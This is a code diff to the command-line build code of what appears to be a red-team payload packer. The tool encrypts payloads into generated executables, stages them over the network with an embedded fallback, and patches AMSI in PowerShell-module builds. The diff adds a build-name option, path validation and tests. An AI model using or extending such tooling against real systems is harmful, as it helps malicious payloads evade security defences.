@@ -17,7 +17,7 @@ mod techniques;
 mod ui;
 mod wizard;
 
-use std::collections::{BTreeMap, BTreeSet};
+use std::collections::BTreeMap;
 use std::path::{Path, PathBuf};
 use std::time::Instant;
 
@@ -32,7 +32,7 @@ use plan::schema::{
     Arch, CryptoAlgorithm, KeySource, OutputKind, PayloadFormat, PayloadPlan, Subsystem, TrimPaths,
 };
 use plan::steps::ResolvedStep;
-use techniques::{Category, RuntimeStep, TechniqueKind};
+use techniques::{network_stager, Category, RuntimeStep, TechniqueKind};
 use ui::{format_elapsed, glyph, human_size, Palette};
 
 /// Extra help printed under the generated usage block.
@@ -104,6 +104,13 @@ enum Commands {
         /// `build.stub.debug`. Laboratory use only.
         #[arg(long)]
         debug: bool,
+
+        /// Name the scratch directory `build/<NAME>` instead of a unique
+        /// `build/run-<pid>-<nanos>`, so a run lands on a stable path. The
+        /// generated `main.rs`, `out.exe` and `out.pdb` live there, together,
+        /// which is exactly what a debugger needs (see `--debug`).
+        #[arg(long, value_name = "NAME", visible_alias = "build-debug-name")]
+        build_name: Option<String>,
     },
 
     /// Run a static audit of a PE and print a readable report.
@@ -231,6 +238,7 @@ fn run() -> Result<()> {
             args,
             dry_run: is_dry_run,
             debug: debug_flag,
+            build_name,
         } => match action {
             Some(BuildAction::Interactive { payload, plan_out }) => {
                 if plan.is_some() {
@@ -246,7 +254,15 @@ fn run() -> Result<()> {
                     if is_dry_run {
                         dry_run(&plan, &path, &ui)?;
                     } else {
-                        build(&plan, &build_args, &path, &ui, cli.verbose, debug_flag)?;
+                        build(
+                            &plan,
+                            &build_args,
+                            &path,
+                            &ui,
+                            cli.verbose,
+                            debug_flag,
+                            build_name.as_deref(),
+                        )?;
                     }
                 }
             }
@@ -264,7 +280,15 @@ fn run() -> Result<()> {
                 if is_dry_run {
                     dry_run(&plan, &plan_path, &ui)?;
                 } else {
-                    build(&plan, &build_args, &plan_path, &ui, cli.verbose, debug_flag)?;
+                    build(
+                        &plan,
+                        &build_args,
+                        &plan_path,
+                        &ui,
+                        cli.verbose,
+                        debug_flag,
+                        build_name.as_deref(),
+                    )?;
                 }
             }
         },
@@ -369,6 +393,27 @@ fn validate_techniques(ui: &Palette) {
 /// `verbose` adds a resolved-plan block, per-step detail lines and
 /// timings; the compact form stays on one line per step. `debug_override`
 /// forces the debug build on (`--debug`), on top of `build.stub.debug`.
+/// How every `network_stager` step delivers its payload: strictly staged (the
+/// payload is left out of the artifact) or staged with the embedded copy as a
+/// fallback (`fallback: embedded`).
+fn stager_sources(steps: &[ResolvedStep]) -> BTreeMap<String, steps::PayloadSource> {
+    steps
+        .iter()
+        .filter_map(|step| match &step.technique {
+            TechniqueKind::NetworkStager { params } => Some((
+                params.payload.clone(),
+                match params.fallback {
+                    network_stager::StagerFallback::None => steps::PayloadSource::Staged,
+                    network_stager::StagerFallback::Embedded => {
+                        steps::PayloadSource::StagedWithFallback
+                    }
+                },
+            )),
+            _ => None,
+        })
+        .collect()
+}
+
 fn build(
     plan: &plan::Plan,
     build_args: &BTreeMap<String, String>,
@@ -376,6 +421,7 @@ fn build(
     ui: &Palette,
     verbose: bool,
     debug_override: bool,
+    build_name: Option<&str>,
 ) -> Result<()> {
     let started = Instant::now();
     let debug = plan.build.stub.debug || debug_override;
@@ -460,27 +506,27 @@ fn build(
     // A `kind: psmodule` build is a managed PowerShell module, not a Rust stub:
     // it compiles generated C# instead of the stub template.
     if plan.build.output.kind == OutputKind::PsModule {
-        return build_psmodule(plan, &steps, plan_path, ui, verbose);
+        return build_psmodule(plan, &steps, plan_path, ui, verbose, build_name);
     }
 
     // 3. Encrypt every Execution step's payload and collect the renderer input.
-    let build_dir = scratch_dir();
+    let build_dir = scratch_dir(build_name)?;
     prepare_build_dir(&build_dir)?;
+    if build_name.is_some() {
+        // A named build has a stable path by construction; surfacing it is what
+        // lets an operator (or the debugger) find `main.rs`/`out.exe` again.
+        anstream::println!("{}", ui.field("scratch", build_dir.display()));
+    }
 
     let mut step_payloads = Vec::new();
     let mut step_records = Vec::new();
     let mut total_plaintext: usize = 0;
     let mut nonces: Vec<(usize, [u8; 24], [u8; 32])> = Vec::new();
 
-    // Payloads named by a `network_stager` step are fetched at run time, not
-    // embedded, so the build skips reading/encrypting/writing them.
-    let staged_payloads: BTreeSet<String> = steps
-        .iter()
-        .filter_map(|step| match &step.technique {
-            TechniqueKind::NetworkStager { params } => Some(params.payload.clone()),
-            _ => None,
-        })
-        .collect();
+    // How a `network_stager` step delivers its payload: strictly staged (the
+    // build skips reading/encrypting/writing it) or staged with the embedded
+    // copy as a fallback (`fallback: embedded`).
+    let staged_payloads = stager_sources(&steps);
 
     for step in &steps {
         let mut record = engine::manifest::StepRecord {
@@ -493,8 +539,12 @@ fn build(
             nonce: None,
         };
 
+        let staged_source = step
+            .payload
+            .as_ref()
+            .and_then(|payload| staged_payloads.get(&payload.name).copied());
         let cipher = match &step.payload {
-            Some(payload) if staged_payloads.contains(&payload.name) => {
+            Some(payload) if staged_source == Some(steps::PayloadSource::Staged) => {
                 // A payload fetched at run time by a `network_stager` step is not
                 // embedded: nothing is read, encrypted or written for it.
                 anstream::println!(
@@ -517,7 +567,7 @@ fn build(
                     args: payload.plan.args.clone().unwrap_or_default(),
                     args_override: payload.plan.args_mode == engine::args::ArgsMode::Override,
                     marker: stub::generate_stub_marker(),
-                    staged: true,
+                    source: steps::PayloadSource::Staged,
                 })
             }
             Some(payload) => {
@@ -579,6 +629,9 @@ fn build(
                     parts.push(ui.dim(format!("export {export}")));
                 }
                 parts.push(ui.brand(crypto_label(payload.crypto.algo)));
+                if staged_source == Some(steps::PayloadSource::StagedWithFallback) {
+                    parts.push(ui.brand("staged fallback"));
+                }
                 anstream::println!(
                     "{}",
                     ui.done(
@@ -632,7 +685,7 @@ fn build(
                     args: payload.plan.args.clone().unwrap_or_default(),
                     args_override: payload.plan.args_mode == engine::args::ArgsMode::Override,
                     marker: stub::generate_stub_marker(),
-                    staged: false,
+                    source: staged_source.unwrap_or(steps::PayloadSource::Embedded),
                 })
             }
             None => {
@@ -964,10 +1017,14 @@ fn build_psmodule(
     plan_path: &Path,
     ui: &Palette,
     _verbose: bool,
+    build_name: Option<&str>,
 ) -> Result<()> {
     let started = Instant::now();
-    let build_dir = scratch_dir();
+    let build_dir = scratch_dir(build_name)?;
     prepare_build_dir(&build_dir)?;
+    if build_name.is_some() {
+        anstream::println!("{}", ui.field("scratch", build_dir.display()));
+    }
 
     let patch_amsi = steps
         .iter()
@@ -1166,13 +1223,7 @@ fn dry_run(plan: &plan::Plan, plan_path: &Path, ui: &Palette) -> Result<()> {
     let resources = resolve_resources(plan);
 
     let steps = plan::steps::resolve(plan)?;
-    let staged_payloads: BTreeSet<String> = steps
-        .iter()
-        .filter_map(|step| match &step.technique {
-            TechniqueKind::NetworkStager { params } => Some(params.payload.clone()),
-            _ => None,
-        })
-        .collect();
+    let staged_payloads = stager_sources(&steps);
     for step in &steps {
         let Some(payload) = &step.payload else {
             anstream::println!(
@@ -1188,9 +1239,10 @@ fn dry_run(plan: &plan::Plan, plan_path: &Path, ui: &Palette) -> Result<()> {
             );
             continue;
         };
-        // A staged payload is fetched at run time, so there are no bytes to read
-        // or validate here (the build skips it too).
-        if staged_payloads.contains(&payload.name) {
+        // A strictly staged payload is fetched at run time, so there are no bytes
+        // to read or validate here (the build skips it too). A staged payload with
+        // an embedded fallback is read like any embedded one.
+        if staged_payloads.get(&payload.name) == Some(&steps::PayloadSource::Staged) {
             anstream::println!(
                 "{}",
                 ui.done(
@@ -1213,6 +1265,9 @@ fn dry_run(plan: &plan::Plan, plan_path: &Path, ui: &Palette) -> Result<()> {
         ];
         if let Some(export) = &payload.plan.export {
             parts.push(ui.dim(format!("export {export}")));
+        }
+        if staged_payloads.get(&payload.name) == Some(&steps::PayloadSource::StagedWithFallback) {
+            parts.push(ui.brand("staged fallback"));
         }
         if payload.plan.sha256.is_some() {
             parts.push(ui.ok("sha256 verified"));
@@ -1833,16 +1888,58 @@ fn prepare_build_dir(dir: &Path) -> Result<()> {
 ///
 /// Defaults to a unique `build/run-<pid>-<nanos>` directory next to the
 /// manifest, so concurrent `picaro build` runs never share — and never wipe —
-/// each other's intermediate files. `PICARO_BUILD_DIR`, when set and non-empty,
-/// is used verbatim for reproducible single-directory workflows (e.g. the
-/// read-only Docker source tree).
-fn scratch_dir() -> PathBuf {
+/// each other's intermediate files. A `--build-name NAME` replaces that unique
+/// run label with `NAME` (`build/NAME`), trading isolation for a stable path a
+/// debugger can rely on. `PICARO_BUILD_DIR`, when set and non-empty, replaces
+/// the `build` base for reproducible single-directory workflows (e.g. the
+/// read-only Docker source tree); a `--build-name` stacks on top of it.
+fn scratch_dir(build_name: Option<&str>) -> Result<PathBuf> {
     let override_dir = std::env::var_os("PICARO_BUILD_DIR").map(PathBuf::from);
     let manifest_dir = Path::new(env!("CARGO_MANIFEST_DIR"));
-    match &override_dir {
-        Some(dir) if !dir.as_os_str().is_empty() => scratch_dir_in(override_dir, manifest_dir),
-        _ => unique_scratch_dir_in(manifest_dir, &run_nonce()),
+    scratch_dir_for(override_dir, manifest_dir, build_name)
+}
+
+/// Testable core of [`scratch_dir`]: resolves the override/manifest base, then
+/// applies the `--build-name` (or the unique run label) on top.
+fn scratch_dir_for(
+    override_dir: Option<PathBuf>,
+    manifest_dir: &Path,
+    build_name: Option<&str>,
+) -> Result<PathBuf> {
+    if let Some(name) = build_name {
+        // A named directory is deliberately *not* unique: the whole point is
+        // that `build/<name>/main.rs` is the same path next run. Two concurrent
+        // builds that pass the same name share it, which is the caller's call.
+        return Ok(scratch_dir_in(override_dir, manifest_dir).join(bare_dir_component(name)?));
     }
+    if override_dir
+        .as_ref()
+        .is_some_and(|dir| !dir.as_os_str().is_empty())
+    {
+        return Ok(scratch_dir_in(override_dir, manifest_dir));
+    }
+    Ok(unique_scratch_dir_in(manifest_dir, &run_nonce()))
+}
+
+/// Accepts a `--build-name` only when it is a single, ordinary directory name.
+///
+/// The flag names one folder under the scratch root; it is not a path. Rejecting
+/// separators, a drive prefix and `.`/`..` keeps a mistyped name from writing
+/// anywhere else on disk.
+fn bare_dir_component(name: &str) -> Result<&str> {
+    let trimmed = name.trim();
+    let invalid = trimmed.is_empty()
+        || trimmed == "."
+        || trimmed == ".."
+        || trimmed.contains('/')
+        || trimmed.contains('\\')
+        || trimmed.contains(':');
+    if invalid {
+        return Err(error::PackerError::Usage(format!(
+            "--build-name must be a single directory name (got {name:?})"
+        )));
+    }
+    Ok(trimmed)
 }
 
 /// Resolves [`scratch_dir`] from an explicit `PICARO_BUILD_DIR` value (when set
@@ -1933,5 +2030,44 @@ mod tests {
     fn unique_scratch_dir_lives_in_a_run_folder_under_build() {
         let dir = unique_scratch_dir_in(Path::new("/usr/src/picaro"), "42-123");
         assert_eq!(dir, Path::new("/usr/src/picaro/build/run-42-123"));
+    }
+
+    #[test]
+    fn a_build_name_pins_the_scratch_dir_under_build() {
+        let dir = scratch_dir_for(None, Path::new("/usr/src/picaro"), Some("debug"))
+            .expect("a bare name is accepted");
+        assert_eq!(dir, Path::new("/usr/src/picaro/build/debug"));
+    }
+
+    #[test]
+    fn a_build_name_stacks_on_top_of_the_picaro_build_dir_override() {
+        let dir = scratch_dir_for(
+            Some(PathBuf::from("/tmp/picaro-build")),
+            Path::new("/usr/src/picaro"),
+            Some("debug"),
+        )
+        .expect("a bare name is accepted");
+        assert_eq!(dir, Path::new("/tmp/picaro-build/debug"));
+    }
+
+    #[test]
+    fn without_a_build_name_the_override_dir_is_kept_verbatim() {
+        let dir = scratch_dir_for(
+            Some(PathBuf::from("/tmp/picaro-build")),
+            Path::new("/usr/src/picaro"),
+            None,
+        )
+        .expect("no name, no error");
+        assert_eq!(dir, Path::new("/tmp/picaro-build"));
+    }
+
+    #[test]
+    fn a_build_name_that_is_a_path_is_rejected() {
+        for name in ["", "   ", ".", "..", "a/b", "a\\b", "C:"] {
+            assert!(
+                scratch_dir_for(None, Path::new("/usr/src/picaro"), Some(name)).is_err(),
+                "{name:?} must be rejected as a build name"
+            );
+        }
     }
 }
